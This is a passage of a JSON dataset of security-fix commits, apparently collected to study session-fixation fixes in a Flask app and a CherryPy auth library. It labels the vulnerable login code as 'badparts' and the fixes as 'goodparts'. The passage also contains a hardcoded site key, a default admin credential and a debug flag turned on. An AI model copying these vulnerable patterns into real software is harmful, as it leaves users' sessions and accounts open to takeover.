          form.errors['EPERM'] = 'There is no intro(2) error code for web errors'\n                    pass\n                else:\n                    field.errors.append(row[2])\n            except AttributeError as e:\n                pass\n    return render_template('aaa\/login.html', form=form)\n\n\n@module.route('\/logout')\ndef logout():\n    # Nuke every key in the session\n    for k in session.keys():\n        session.pop(k)\n    flash('You were logged out')\n    return render_template('aaa\/logout.html')\n\n\n@module.route('\/register', methods=('GET','POST'))\ndef register():\n    form = RegisterForm()\n    if not session.has_key('i'):\n        session['i'] = gen_session_id()\n\n    if form.validate_on_submit():\n        # Form validates, execute the registration pl function\n\n        remote_addr = request.environ['REMOTE_ADDR']\n\n        # Hash the password once here:\n        h = hashlib.new('sha256')\n        h.update(current_app.config['PASSWORD_HASH'])\n        h.update(form.password.data)\n        shapass = h.digest()\n\n        ses = db.session\n        result = ses.execute(\n            text(\"SELECT ret, col, msg FROM aaa.register(:email, :pw, :ip) AS (ret BOOL, col TEXT, msg TEXT)\",\n                 bindparams=[\n                    bindparam('email', form.email.data),\n                    bindparam('pw', shapass, type_=LargeBinary),\n                    bindparam('ip', remote_addr)]))\n        row = result.first()\n        if row[0] == True:\n            ses.commit()\n            flash('Thanks for registering! Please check your %s email account to confirm your email address.' % (form.email.data))\n            return redirect(url_for('aaa.login'))\n        else:\n            # Return a useful error message from the database\n            try:\n                field = form.__getattribute__(row[1])\n                field.errors.append(row[2])\n            except AttributeError as e:\n                pass\n    return render_template('aaa\/register.html', form=form)\n"}},"msg":"aaa.login now generates a new session ID to prevent possible fixation attacks.\n\nSigned-off-by: Sean Chittenden <sean@chittenden.org>"}},"https:\/\/github.com\/wwoods\/lamegame_cherrypy_authority":{"6f3c2d3d9a272483aaee21a17c043a2d7eb5f106":{"url":"https:\/\/api.github.com\/repos\/wwoods\/lamegame_cherrypy_authority\/commits\/6f3c2d3d9a272483aaee21a17c043a2d7eb5f106","html_url":"https:\/\/github.com\/wwoods\/lamegame_cherrypy_authority\/commit\/6f3c2d3d9a272483aaee21a17c043a2d7eb5f106","message":"Reconfigured sessions a bit - by default, persist the session.  Create a new session id if the session specified in the client's cookie is expired.  Touch the new session to make it persistent.  When a login information is transmitted, change the session id to prevent some types of session fixation.","sha":"6f3c2d3d9a272483aaee21a17c043a2d7eb5f106","keyword":"session fixation prevent","diff":"diff --git a\/lg_authority\/authinterface.py b\/lg_authority\/authinterface.py\nindex 77e3396..4effa6a 100644\n--- a\/lg_authority\/authinterface.py\n+++ b\/lg_authority\/authinterface.py\n@@ -267,10 +267,16 @@ def login(self, username, admin=False):\n         record = self.user_get_record(username)\n         d = record.todict()\n         d['__name__'] = username\n-        cherrypy.session['auth'] = d\n-        cherrypy.session['authtime'] = datetime.datetime.utcnow()\n+        changeset = {\n+            'auth': d\n+            ,'authtime': datetime.datetime.utcnow()\n+            }\n         if admin:\n-            cherrypy.session['authtime_admin'] = datetime.datetime.utcnow()\n+            changeset['authtime_admin'] = datetime.datetime.utcnow()\n+\n+        #Guard against session fixation - see regen_id docstring\n+        cherrypy.session.regen_id()\n+        cherrypy.session.update(changeset)\n \n         self.serve_user_from_dict(d)\n         return record\ndiff --git a\/lg_authority\/common_config.py b\/lg_authority\/common_config.py\nindex 7157297..9c3ae02 100644\n--- a\/lg_authority\/common_config.py\n+++ b\/lg_authority\/common_config.py\n@@ -144,7 +144,7 @@ class ConfigDict(dict):\n         }\n     #Your public and private keys for recaptcha, or None to disable recaptcha\n     ,\n-    'site_debug': False\n+    'site_debug': True\n     #Print debug messages for lg_authority?  True\/False\n     ,\n     'override_sessions': True\ndiff --git a\/lg_authority\/slates\/__init__.py b\/lg_authority\/slates\/__init__.py\nindex 481658e..77eec76 100644\n--- a\/lg_authority\/slates\/__init__.py\n+++ b\/lg_authority\/slates\/__init__.py\n@@ -11,7 +11,7 @@\n import cherrypy\n from ..common import *\n from .slates import Slate\n-from .session import init_session\n+from .session import init_session, send_session_cookie\n \n #Seed global config with Slate variable\n config.Slate = Slate\ndiff --git a\/lg_authority\/slates\/session.py b\/lg_authority\/slates\/session.py\nindex da55783..781f9fb 100644\n--- a\/lg_authority\/slates\/session.py\n+++ b\/lg_authority\/slates\/session.py\n@@ -42,8 +42,16 @@ def __init__(self, id=None, **kwargs):\n             if ttl < self.timeout \/\/ 2 or ttl < self.timeout - 60*60:\n                 self.touch()\n                 self._update_cookie = True\n-\n-        #The response cookie is set in init_session(), at the bottom of this\n+        else:\n+            #This is a brand new session.  We should probably\n+            #touch it to prevent it from expiring.  We could just send a \n+            #new session ID on each request, like the default CherryPy \n+            #behavior, but for an application with AJAX login this \n+            #can cause very weird issues.\n+            self.touch()\n+            self._update_cookie = True\n+\n+        #The response cookie is set in send_session_cookie(), at the bottom of this\n         #file.\n \n     def is_response_cookie_needed(self):\n@@ -67,6 +75,21 @@ def expire(self):\n         cherrypy.serving.response.cookie[self.session_cookie] = 'expired'\n         cherrypy.serving.response.cookie[self.session_cookie]['expires'] = httputil.HTTPDate(e)\n \n+    def regen_id(self):\n+        \"\"\"Copies all of the data for this cookie, but regenerates\n+        it under a new identifier.  Some sources recommend changing \n+        session id on login, and that is what this does.  Essentially\n+        prevents an attacker from creating a blank, persistent session,\n+        getting a user to log in through whatever means, and then \n+        using the previously blank session as a logged in session of\n+        the victim.\n+        \"\"\"\n+        data = self.todict()\n+        Slate.expire(self)\n+        self._test_id()\n+        self.update(data)\n+        self._update_cookie = True\n+\n     def _test_id(self):\n         \"\"\"Test if we are expired.  If we are, assign a new id\"\"\"\n         #Force the session timeout to always update with the site's preferences.\n@@ -148,14 +171,29 @@ def init_session(\n     # the requested session data.\n     cherrypy.serving.session = sess = Session(id, **kwargs)\n     \n+def send_session_cookie(\n+    session_path=None\n+    , session_path_header=None\n+    , session_domain=None\n+    , session_secure=False\n+    , session_httponly=True\n+    , session_persistent=True\n+    , **kwargs\n+    ):\n+    \"\"\"Send the session cookie after the body in case the request\n+    regenerated the session id and it needs to be retransmitted.\n+    \"\"\"\n+    sess = cherrypy.serving.session\n     if sess.is_response_cookie_needed():\n+        session_cookie = kwargs.get('session_cookie', Session.session_cookie)\n+        cookie_timeout = kwargs.get('session_timeout', Session.timeout)\n         if not session_persistent:\n             # See http:\/\/support.microsoft.com\/kb\/223799\/EN-US\/\n             # and http:\/\/support.mozilla.com\/en-US\/kb\/Cookies\n             cookie_timeout = None\n         set_response_cookie(\n           path=session_path, path_header=session_path_header\n-          , name=name\n+          , name=session_cookie\n           , timeout=cookie_timeout\n           , domain=session_domain\n           , secure=session_secure\ndiff --git a\/lg_authority\/tools.py b\/lg_authority\/tools.py\nindex 7b76713..3edc279 100644\n--- a\/lg_authority\/tools.py\n+++ b\/lg_authority\/tools.py\n@@ -100,6 +100,7 @@ def _setup(self):\n                                      #priority, since we read the session.\n         if conf['override_sessions']:\n             hooks.attach('before_request_body', slates.init_session, priority=p-10, **conf)\n+            hooks.attach('before_finalize', slates.send_session_cookie, priority=p, **conf)\n         hooks.attach('before_request_body', self.check_auth, priority=p, **conf)\n \n     def _setup_initialize(self, conf):\n","files":{"\/lg_authority\/authinterface.py":{"changes":[{"diff":"\n         record = self.user_get_record(username)\n         d = record.todict()\n         d['__name__'] = username\n-        cherrypy.session['auth'] = d\n-        cherrypy.session['authtime'] = datetime.datetime.utcnow()\n+        changeset = {\n+            'auth': d\n+            ,'authtime': datetime.datetime.utcnow()\n+            }\n         if admin:\n-            cherrypy.session['authtime_admin'] = datetime.datetime.utcnow()\n+            changeset['authtime_admin'] = datetime.datetime.utcnow()\n+\n+        #Guard against session fixation - see regen_id docstring\n+        cherrypy.session.regen_id()\n+        cherrypy.session.update(changeset)\n \n         self.serve_user_from_dict(d)\n         return record","add":9,"remove":3,"filename":"\/lg_authority\/authinterface.py","badparts":["        cherrypy.session['auth'] = d","        cherrypy.session['authtime'] = datetime.datetime.utcnow()","            cherrypy.session['authtime_admin'] = datetime.datetime.utcnow()"],"goodparts":["        changeset = {","            'auth': d","            ,'authtime': datetime.datetime.utcnow()","            }","            changeset['authtime_admin'] = datetime.datetime.utcnow()","        cherrypy.session.regen_id()","        cherrypy.session.update(changeset)"]},{"diff":"\n         record = self.user_get_record(username)\n         d = record.todict()\n         d['__name__'] = username\n-        cherrypy.session['auth'] = d\n-        cherrypy.session['authtime'] = datetime.datetime.utcnow()\n+        changeset = {\n+            'auth': d\n+            ,'authtime': datetime.datetime.utcnow()\n+            }\n         if admin:\n-            cherrypy.session['authtime_admin'] = datetime.datetime.utcnow()\n+            changeset['authtime_admin'] = datetime.datetime.utcnow()\n+\n+        #Guard against session fixation - see regen_id docstring\n+        cherrypy.session.regen_id()\n+        cherrypy.session.update(changeset)\n \n         self.serve_user_from_dict(d)\n         return record","add":9,"remove":3,"filename":"\/lg_authority\/authinterface.py","badparts":["        cherrypy.session['auth'] = d","        cherrypy.session['authtime'] = datetime.datetime.utcnow()","            cherrypy.session['authtime_admin'] = datetime.datetime.utcnow()"],"goodparts":["        changeset = {","            'auth': d","            ,'authtime': datetime.datetime.utcnow()","            }","            changeset['authtime_admin'] = datetime.datetime.utcnow()","        cherrypy.session.regen_id()","        cherrypy.session.update(changeset)"]}],"source":"\nimport datetime from.common import * from. import passwords from.slates import Slate class UserObject: \"\"\"An object representing the current logged in user. Served as cherrypy.user. \"\"\" id=None id__doc=\"The username of the current user\" groups=[] groups__doc=\"List of groups to which the user belongs\" slate=None slate__doc=\"The user's slate for the current request\" def __init__(self, session_dict): self.id=session_dict['__name__'] self.groups=session_dict['groups'] self.slate=Slate( cherrypy.serving.lg_authority['user_slate_section'] ,self.id ) self.__slate__=config.auth.user_get_record(self.id) def __getitem__(self, key): return self.__slate__[key] def __setitem__(self, key, value): self.__slate__[key]=value def __delitem___(self, key): del self.__slate__[key] def get(self, key, default=None): return self.__slate__.get(key, default) def pop(self, key, default=None): \"\"\"Return D[key] and remove key from D, or default.\"\"\" return self.__slate__.pop(key, default) def update(self, d): \"\"\"D.update(E) -> None. Update D from E: for k in E: D[k]=E[k].\"\"\" self.__slate__.update(d) def setdefault(self, key, default=None): \"\"\"D.setdefault(k[,d]) -> D.get(k,d), also set D[k]=d if k not in D.\"\"\" return self.__slate__.setdefault(key, default) def keys(self): return self.__slate__.keys() def values(self): return self.__slate__.values() def items(self): return self.__slate__.items() class AuthInterface(object): \"\"\"The interface for auth-specific functions with the storage backend. \"\"\" def user_name_invalid(self, username): \"\"\"Return a human-readable error if username is invalid or has invalid characters. \"\"\" if '\"' in username or \"'\" in username: return \"Name may not have quotes\" if '<' in username or '>' in username: return \"Name may not have > or <\" if ' ' in username: return \"Name may not have spaces\" if '@' in username: return \"Name may not contain the @ symbol\" if '\/' in username: return \"Name may not contain the \/ symbol\" return False def user_create(self, username, data, timeout=missing): \"\"\"Inserts a user or raises an *Error\"\"\" kwargs={ 'timeout': None} if timeout is not missing: kwargs={ 'timeout': timeout, 'force_timeout': True} user=Slate('user', 'user-' +username) if not user.is_expired(): raise AuthError('User already exists') user.update(data) def user_create_holder(self, username, data): \"\"\"Inserts a placeholder for the given username. Raises an AuthError if the username specified is already an existing user or placeholder user. \"\"\" kwargs={ 'timeout': None} if config['site_registration_timeout'] !=None: kwargs['timeout']=config['site_registration_timeout'] * 60 * 24 sname=Slate('user', 'user-' +username) if not sname.is_expired(): raise AuthError('Username already taken') pname=Slate('user', 'userhold-' +username, **kwargs) if not pname.is_expired(): raise AuthError('Username already taken') oname=Slate('user', 'userold-' +username) if not oname.is_expired(): raise AuthError('Username already taken') pname.update(data) def user_exists(self, username): userrec=Slate('user', 'user-' +username) userhold=Slate('user', 'userhold-' +username) userold=Slate('user', 'userold-' +username) if not userrec.is_expired(): return True if not userhold.is_expired(): return True if not userold.is_expired(): return True return False def user_get_holder(self, username): pname='userhold-' +username return Slate('user', pname) def user_promote_holder(self, holder): \"\"\"Promotes the passed holder slate to a full user\"\"\" uname='user-' +holder.id[len('userhold-'):] uargs={} for k,v in holder.items(): uargs[k]=v user=Slate('user', uname) if not user.is_expired(): raise AuthError('User already activated') user.update(uargs) holder.expire() def user_get_inactive(self, username): pname='userold-' +username return Slate('user', pname) def user_activate(self, username): pname='userold-' +username inact=Slate('user', pname) if inact.is_expired(): raise AuthError('Cannot activate non-inactive user') items=inact.todict() nname='user-' +username s=Slate('user', nname) s.update(items) inact.expire() def user_deactivate(self, username): oname='user-' +username act=Slate('user', oname) if act.is_expired(): raise AuthError('Cannot deactive non-active user') items=act.todict() nname='userold-' +username s=Slate('user', nname) s.update(items) act.expire() def user_get_record(self, username): \"\"\"Returns the record for the given username(or None). \"\"\" slate=Slate('user', 'user-' +username) return slate def get_user_from_email(self, email): \"\"\"Returns the username for the given email, or None. \"\"\" result=config.Slate.find_with('user', 'emails', email) if len(result)==1 and result[0].id.startswith('user-'): return result[0].id[len('user-'):] elif len(result)==1: raise AuthError('This e-mail is in use by an inactive user') elif len(result)==0: return None else: raise AuthError(\"More than one user has this e-mail!\") def get_user_from_openid(self, openid_url): \"\"\"Returns the username for the given openid_url, or None. \"\"\" result=config.Slate.find_with('user', 'auth_openid', openid_url) if len(result)==0: return None elif len(result)==1: if result[0].id.startswith('user-'): return result[0].id[len('user-'):] raise AuthError('This OpenID is in use by an inactive user') else: raise AuthError('This OpenID is in use') def get_user_password(self, username): \"\"\"Returns a dict consisting of a \"date\" element that is the UTC time when the password was set, and a \"pass\" element that is the tuple\/list(type, hashed_pass) for the given username. Returns None if the user specified does not have a password to authenticate through or does not exist. \"\"\" user=Slate('user', 'user-' +username) if user.is_expired(): return None return user.get('auth_password', None) def set_user_password(self, username, new_pass): \"\"\"Updates the given user's password. new_pass is a tuple (algorithm, hashed) that is the user's new password. \"\"\" user=Slate('user', 'user-' +username) if user.is_expired(): raise ValueError('User not found') user['auth_password']={ 'date': datetime.datetime.utcnow(), 'pass': new_pass} cherrypy.session.pop('authtime_admin') def _get_group_name(self, groupid): \"\"\"Retrieves the name for the given groupid. This is subclassed as _get_group_name because get_group_name automatically handles user-, any, and auth groups \"\"\" group=Slate('user', 'group-' +groupid) if not group.is_expired(): return group['name'] return 'Unnamed({0})'.format(groupid) def group_create(self, groupid, data, timeout=missing): \"\"\"Insert the specified group, or raise an *Error\"\"\" kwargs={ 'timeout': None} if timeout is not missing: kwargs={ 'timeout': timeout, 'force_timeout': True} sname=Slate('user', 'group-' +groupid, **kwargs) if not sname.is_expired(): raise AuthError('Group already exists') sname.update(data) def login(self, username, admin=False): \"\"\"Logs in the specified username. Returns the user record.\"\"\" record=self.user_get_record(username) d=record.todict() d['__name__']=username cherrypy.session['auth']=d cherrypy.session['authtime']=datetime.datetime.utcnow() if admin: cherrypy.session['authtime_admin']=datetime.datetime.utcnow() self.serve_user_from_dict(d) return record def login_time_elapsed(self): \"\"\"Gets the t=datetime.datetime.utcnow() -cherrypy.session['authtime'] return t.days * 24 * 60 * 60 +t.seconds def login_is_admin(self): \"\"\"Returns True if the current login is allowed to make administrative changes to the account, or False otherwise. \"\"\" authtime_admin=cherrypy.session.get('authtime_admin') if authtime_admin is None: return False t=datetime.datetime.utcnow() -authtime_admin if t.days * 24 * 60 * 60 +t.seconds < config['site_admin_login_window']: return True return False def serve_user_from_dict(self, d): \"\"\"Sets cherrypy.serving.user based on the passed auth dict. d may be None. \"\"\" if d is not None: cherrypy.serving.user=UserObject(d) else: cherrypy.serving.user=None def logout(self): \"\"\"Log out the current logged in user.\"\"\" if hasattr(cherrypy.session, 'expire'): cherrypy.session.expire() else: cherrypy.lib.sessions.expire() def old_password(self, username): renew=config['site_password_renewal'] if renew is None: return passw=self.get_user_password(username) if passw is None: return False if(datetime.datetime.utcnow() -passw['date']).days >=renew: return True return False def test_password(self, username, password): \"Returns username for OK, None for failed auth\" if '@' in username: username=self.get_user_from_email(username) if username is None: return None expected=self.get_user_password(username) if expected is None: return None if passwords.verify(password, expected['pass']): return username return None def get_group_name(self, groupid): \"\"\"Returns the common name for the given groupid. groupid may be the special identifiers 'any', 'auth', or 'user-' as well. \"\"\" if groupid=='any': return 'Everyone' elif groupid=='auth': return 'Logged In Users' elif groupid.startswith('user-'): return 'User -' +groupid[5:] return self._get_group_name(groupid) ","sourceWithComments":"import datetime\n\nfrom .common import *\nfrom . import passwords\nfrom .slates import Slate\n\nclass UserObject:\n    \"\"\"An object representing the current logged in user.\n    Served as cherrypy.user.\n    \"\"\"\n\n    id = None\n    id__doc = \"The username of the current user\"\n\n    groups = []\n    groups__doc = \"List of groups to which the user belongs\"\n\n    slate = None\n    slate__doc = \"The user's slate for the current request\"\n\n    def __init__(self, session_dict):\n        self.id = session_dict['__name__']\n        self.groups = session_dict['groups']\n        self.slate = Slate(\n            cherrypy.serving.lg_authority['user_slate_section']\n            ,self.id\n            )\n\n        #If they're logged in, they'd better be active.\n        self.__slate__ = config.auth.user_get_record(self.id)\n\n    def __getitem__(self, key):\n        return self.__slate__[key]\n\n    def __setitem__(self, key, value):\n        self.__slate__[key] = value\n\n    def __delitem___(self, key):\n        del self.__slate__[key]\n\n    def get(self, key, default=None):\n        return self.__slate__.get(key, default)\n\n    def pop(self, key, default=None):\n        \"\"\"Return D[key] and remove key from D, or default.\"\"\"\n        return self.__slate__.pop(key, default)\n\n    def update(self, d):\n        \"\"\"D.update(E) -> None.  Update D from E: for k in E: D[k] = E[k].\"\"\"\n        self.__slate__.update(d)\n\n    def setdefault(self, key, default=None):\n        \"\"\"D.setdefault(k[,d]) -> D.get(k,d), also set D[k]=d if k not in D.\"\"\"\n        return self.__slate__.setdefault(key, default)\n\n    #We don't want to expose clear()..\n\n    def keys(self):\n        return self.__slate__.keys()\n\n    def values(self):\n        return self.__slate__.values()\n\n    def items(self):\n        return self.__slate__.items()\n\nclass AuthInterface(object):\n    \"\"\"The interface for auth-specific functions with the storage backend.\n    \"\"\"\n\n    def user_name_invalid(self, username):\n        \"\"\"Return a human-readable error if username is invalid or\n        has invalid characters.\n        \"\"\"\n        if '\"' in username or \"'\" in username:\n            return \"Name may not have quotes\"\n        if '<' in username or '>' in username:\n            return \"Name may not have > or <\"\n        if ' ' in username:\n            return \"Name may not have spaces\"\n        if '@' in username:\n            return \"Name may not contain the @ symbol\"\n        if '\/' in username:\n            return \"Name may not contain the \/ symbol\"\n        return False\n\n    def user_create(self, username, data, timeout=missing):\n        \"\"\"Inserts a user or raises an *Error\"\"\"\n        kwargs = { 'timeout': None }\n        if timeout is not missing:\n            kwargs = { 'timeout': timeout, 'force_timeout': True }\n\n        user = Slate('user', 'user-' + username)\n        if not user.is_expired():\n            raise AuthError('User already exists')\n\n        user.update(data)\n       \n    def user_create_holder(self, username, data):\n        \"\"\"Inserts a placeholder for the given username.  Raises an AuthError\n        if the username specified is already an existing user or placeholder\n        user.\n        \"\"\"\n        kwargs = { 'timeout': None }\n        if config['site_registration_timeout'] != None:\n            kwargs['timeout'] = config['site_registration_timeout'] * 60 * 24\n            \n        sname = Slate('user', 'user-' + username)\n        if not sname.is_expired():\n            raise AuthError('Username already taken')\n            \n        pname = Slate('user', 'userhold-' + username, **kwargs)\n        if not pname.is_expired():\n            raise AuthError('Username already taken')\n\n        oname = Slate('user', 'userold-' + username)\n        if not oname.is_expired():\n            raise AuthError('Username already taken')\n            \n        #Make the holder\n        pname.update(data)\n\n    def user_exists(self, username):\n        userrec = Slate('user', 'user-' + username)\n        userhold = Slate('user', 'userhold-' + username)\n        userold = Slate('user', 'userold-' + username)\n\n        if not userrec.is_expired():\n            return True\n        if not userhold.is_expired():\n            return True\n        if not userold.is_expired():\n            return True\n        return False\n\n    def user_get_holder(self, username):\n        pname = 'userhold-' + username\n        return Slate('user', pname)\n\n    def user_promote_holder(self, holder):\n        \"\"\"Promotes the passed holder slate to a full user\"\"\"\n        uname = 'user-' + holder.id[len('userhold-'):]\n        uargs = {}\n        for k,v in holder.items():\n            uargs[k] = v\n\n        user = Slate('user', uname)\n        if not user.is_expired():\n            raise AuthError('User already activated')\n\n        user.update(uargs)\n        holder.expire()\n\n    def user_get_inactive(self, username):\n        pname = 'userold-' + username\n        return Slate('user', pname)\n\n    def user_activate(self, username):\n        pname = 'userold-' + username\n        inact = Slate('user', pname)\n        if inact.is_expired():\n            raise AuthError('Cannot activate non-inactive user')\n\n        items = inact.todict()\n        nname = 'user-' + username\n        s = Slate('user', nname)\n        s.update(items)\n\n        #Do this last to keep the user's data in case of unexpected error.\n        inact.expire()\n\n    def user_deactivate(self, username):\n        oname = 'user-' + username\n        act = Slate('user', oname)\n        if act.is_expired():\n            raise AuthError('Cannot deactive non-active user')\n\n        items = act.todict()\n        nname = 'userold-' + username\n        s = Slate('user', nname)\n        s.update(items)\n\n        #Do this last to keep user's data in case of unexpected error\n        act.expire()\n\n    def user_get_record(self, username):\n        \"\"\"Returns the record for the given username (or None).\n        \"\"\"\n        slate = Slate('user', 'user-' + username)\n        return slate\n\n    def get_user_from_email(self, email):\n        \"\"\"Returns the username for the given email, or None.\n        \"\"\"\n        result = config.Slate.find_with('user', 'emails', email)\n        if len(result) == 1 and result[0].id.startswith('user-'):\n            return result[0].id[len('user-'):]\n        elif len(result) == 1: #Inactive user\n            raise AuthError('This e-mail is in use by an inactive user')\n        elif len(result) == 0:\n            return None\n        else:\n            raise AuthError(\"More than one user has this e-mail!\")\n\n    def get_user_from_openid(self, openid_url):\n        \"\"\"Returns the username for the given openid_url, or None.\n        \"\"\"\n        result = config.Slate.find_with('user', 'auth_openid', openid_url)\n        if len(result) == 0:\n            return None\n        elif len(result) == 1:\n            if result[0].id.startswith('user-'):\n                return result[0].id[len('user-'):]\n            #Probably a disabled account or holder\n            raise AuthError('This OpenID is in use by an inactive user')\n        else:\n            raise AuthError('This OpenID is in use')\n\n    def get_user_password(self, username):\n        \"\"\"Returns a dict consisting of a \"date\" element that is the UTC time\n        when the password was set, and a \"pass\" element that is the\n        tuple\/list (type, hashed_pass) for the given username.\n        Returns None if the user specified does not have a password to\n        authenticate through or does not exist.\n        \"\"\"\n        user = Slate('user', 'user-' + username)\n        if user.is_expired():\n            return None\n        return user.get('auth_password', None)\n\n    def set_user_password(self, username, new_pass):\n        \"\"\"Updates the given user's password.  new_pass is a tuple\n        (algorithm, hashed) that is the user's new password.\n        \"\"\"\n        user = Slate('user', 'user-' + username)\n        if user.is_expired():\n            raise ValueError('User not found')\n        user['auth_password'] = { 'date': datetime.datetime.utcnow(), 'pass': new_pass }\n\n        #Clear any admin login flag\n        cherrypy.session.pop('authtime_admin')\n\n    def _get_group_name(self, groupid):\n        \"\"\"Retrieves the name for the given groupid.  This is subclassed as\n        _get_group_name because get_group_name automatically handles user-,\n        any, and auth groups\n        \"\"\"\n        group = Slate('user', 'group-' + groupid)\n        if not group.is_expired():\n            return group['name']\n        return 'Unnamed ({0})'.format(groupid)\n\n    def group_create(self, groupid, data, timeout=missing):\n        \"\"\"Insert the specified group, or raise an *Error\"\"\"\n        kwargs = { 'timeout': None }\n        if timeout is not missing:\n            kwargs = { 'timeout': timeout, 'force_timeout': True }\n\n        sname = Slate('user', 'group-' + groupid, **kwargs)\n        if not sname.is_expired():\n            raise AuthError('Group already exists')\n\n        sname.update(data)\n\n    def login(self, username, admin=False):\n        \"\"\"Logs in the specified username.  Returns the user record.\"\"\"\n        record = self.user_get_record(username)\n        d = record.todict()\n        d['__name__'] = username\n        cherrypy.session['auth'] = d\n        cherrypy.session['authtime'] = datetime.datetime.utcnow()\n        if admin:\n            cherrypy.session['authtime_admin'] = datetime.datetime.utcnow()\n\n        self.serve_user_from_dict(d)\n        return record\n\n    def login_time_elapsed(self):\n        \"\"\"Gets the # of seconds elapsed since the last login.\"\"\"\n        t = datetime.datetime.utcnow() - cherrypy.session['authtime']\n        return t.days * 24 * 60 * 60 + t.seconds\n\n    def login_is_admin(self):\n        \"\"\"Returns True if the current login is allowed to make administrative\n        changes to the account, or False otherwise.\n        \"\"\"\n        authtime_admin = cherrypy.session.get('authtime_admin')\n        if authtime_admin is None:\n            return False\n        t = datetime.datetime.utcnow() - authtime_admin\n        if t.days * 24 * 60 * 60 + t.seconds < config['site_admin_login_window']:\n            return True\n        return False\n\n    def serve_user_from_dict(self, d):\n        \"\"\"Sets cherrypy.serving.user based on the passed auth dict.\n        d may be None.\n        \"\"\"\n        if d is not None:\n            cherrypy.serving.user = UserObject(d)\n        else:\n            cherrypy.serving.user = None\n\n    def logout(self):\n        \"\"\"Log out the current logged in user.\"\"\"\n        if hasattr(cherrypy.session, 'expire'):\n            cherrypy.session.expire()\n        else:\n            cherrypy.lib.sessions.expire()\n\n    def old_password(self, username):\n        renew = config['site_password_renewal']\n        if renew is None:\n            return\n        passw = self.get_user_password(username)\n        if passw is None:\n            #No password, they don't need to renew probably!\n            return False\n        if (datetime.datetime.utcnow() - passw['date']).days >= renew:\n            return True\n        return False\n\n    def test_password(self, username, password):\n        \"Returns username for OK, None for failed auth\"\n        if '@' in username:\n            #Map e-mail to user\n            username = self.get_user_from_email(username)\n            if username is None:\n                return None\n        expected = self.get_user_password(username)\n        if expected is None:\n            return None\n\n        if passwords.verify(password, expected['pass']):\n            return username\n        return None\n\n    def get_group_name(self, groupid):\n        \"\"\"Returns the common name for the given groupid.\n        groupid may be the special identifiers 'any', 'auth', or 'user-'\n        as well.\n        \"\"\"\n\n        if groupid == 'any':\n            return 'Everyone'\n        elif groupid == 'auth':\n            return 'Logged In Users'\n        elif groupid.startswith('user-'):\n            return 'User - ' + groupid[5:]\n        return self._get_group_name(groupid)\n\n"},"\/lg_authority\/common_config.py":{"changes":[{"diff":"\n         }\n     #Your public and private keys for recaptcha, or None to disable recaptcha\n     ,\n-    'site_debug': False\n+    'site_debug': True\n     #Print debug messages for lg_authority?  True\/False\n     ,\n     'override_sessions': Tru","add":1,"remove":1,"filename":"\/lg_authority\/common_config.py","badparts":["    'site_debug': False"],"goodparts":["    'site_debug': True"]},{"diff":"\n         }\n     #Your public and private keys for recaptcha, or None to disable recaptcha\n     ,\n-    'site_debug': False\n+    'site_debug': True\n     #Print debug messages for lg_authority?  True\/False\n     ,\n     'override_sessions': Tru","add":1,"remove":1,"filename":"\/lg_authority\/common_config.py","badparts":["    'site_debug': False"],"goodparts":["    'site_debug': True"]}],"source":"\n\"\"\"A few functions needed for the defaults, followed by a large dict of all of the available configuration options for lg_authority. \"\"\" import re import datetime import cherrypy def get_site_name(): \"\"\"Returns the site domain for the current cherrypy request.\"\"\" name_match=get_site_name.namere.match(cherrypy.request.base) return name_match.group(1) get_site_name.namere=re.compile('^[^:]+:\/\/([^\/:]*)') def email_reg_default_subject(username): return \"\"\"{site} -Registration\"\"\".format(site=get_site_name()) def email_reg_default_body(username): return \"\"\"You have requested registration as{user} at{site}.\"\"\".format( user=username ,site=get_site_name() ) class ConfigDict(dict): \"\"\"Holds all configuration items. Its own class so that it may hold flags as well. \"\"\" config=ConfigDict() config.update({ 'site_auth_root': '\/auth\/' , 'site_key': 'abc123o2qh3otin;oiH , 'site_password_renewal': 365 , 'site_admin_login_window': 120 , 'site_storage': 'ram' , 'site_storage_conf':{ } , 'site_storage_sections_user':{ 'index_lists': [ 'auth_openid', 'groups', 'emails'] } , 'site_storage_sections_session':{ 'cache':[ 'auth', 'authtime', 'authtime_admin'] } , 'site_storage_clean_freq': 60 , 'site_email':{ 'smtpserver': '127.0.0.1' ,'smtpport': 25 ,'smtpssl': False ,'smtpuser': None ,'smtppass': None ,'default': 'Site <test@example.com>' } , 'site_template': None , 'site_user_list':{ 'admin':{ 'auth_password':{ 'date': datetime.datetime.utcnow(), 'pass':[ 'sha256',['bff74028f285748241375d1c9c7f9b6e85fd3900edf8e601a78f7f84d848b42e', 'admin']]} ,'auth_openid':[] ,'groups':[ 'admin'] } } , 'site_group_list':{ 'admin':{ 'name': 'Administrators'} } , 'site_registration': 'email' , 'site_registration_conf':{ 'subject': email_reg_default_subject ,'body': email_reg_default_body } , 'site_registration_timeout': 2 , 'site_registration_recaptcha':{ 'public': None ,'private': None } , 'site_debug': False , 'override_sessions': True , 'session_timeout': 60 , 'session_cookie': 'session_id' , 'user_slate_section': 'userslate' , 'groups':[ 'any'] , 'user_home_page': '..' , 'logout_page': '..' , 'deny_page_anon': '\/auth\/login' , 'deny_page_auth': None }) ","sourceWithComments":"\"\"\"A few functions needed for the defaults, followed by a large dict\nof all of the available configuration options for lg_authority.\n\"\"\"\n\nimport re\nimport datetime\nimport cherrypy\n\ndef get_site_name():\n    \"\"\"Returns the site domain for the current cherrypy request.\"\"\"\n    name_match = get_site_name.namere.match(cherrypy.request.base)\n    return name_match.group(1)\nget_site_name.namere = re.compile('^[^:]+:\/\/([^\/:]*)')\n\ndef email_reg_default_subject(username):\n    return \"\"\"{site} - Registration\"\"\".format(site=get_site_name())\n\ndef email_reg_default_body(username):\n    return \"\"\"You have requested registration as {user} at {site}.\"\"\".format(\n        user=username\n        ,site=get_site_name()\n        )\n\n#config.Slate is set by slates\n\nclass ConfigDict(dict):\n    \"\"\"Holds all configuration items.  Its own class so that\n    it may hold flags as well.\n    \"\"\"\n\nconfig = ConfigDict()\n#Set defaults, show params.  These are overwritten first \n#by any config in the tools.lg_authority or lg_authority aliased section, then\n#by CherryPy config.\n#Any key prefixed with site_ is meant to be site-wide, and will be written\n#to this dict on the first request (NO MATTER WHERE THE REQUEST IS TO).\nconfig.update({\n    'site_auth_root': '\/auth\/'\n    #The absolute path to the site's auth root, with ending slash.\n    ,\n    'site_key': 'abc123o2qh3otin;oiH#*@(TY(#*Th:T*:(@#HTntb982#HN(:@#*TBH:@#(*THioihI#HOIH%oihio3@H%IOH#@%I)(!*@Y%+(+!@H%~`un23gkh'\n    #Site encryption key for passwords.  Should be more than 60 chars.\n    ,\n    'site_password_renewal': 365\n    #Days until users receive warnings that their passwords are old when they\n    #log in.  Use None for no warning.  Only users with passwords 